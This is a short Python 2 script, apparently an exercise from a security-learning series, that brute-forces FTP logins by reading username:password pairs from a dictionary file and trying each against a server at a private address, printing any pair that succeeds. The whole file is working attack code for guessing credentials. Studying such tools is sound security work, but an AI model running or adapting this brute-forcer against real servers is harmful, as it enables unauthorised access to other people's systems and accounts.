#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @Author    :iqiqiya
# @Blog      :iqiqiya.com
# @Time      :2020/6/15
# @FileName  :11.暴力破解FTP口令.py
import ftplib


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: " + userName + "/" + passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + "/" + passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)


def main():
    host = '192.168.1.73'
    passwdFile = 'ftp_dict.txt'
    bruteLogin(host, passwdFile)


if __name__ == '__main__':
    main()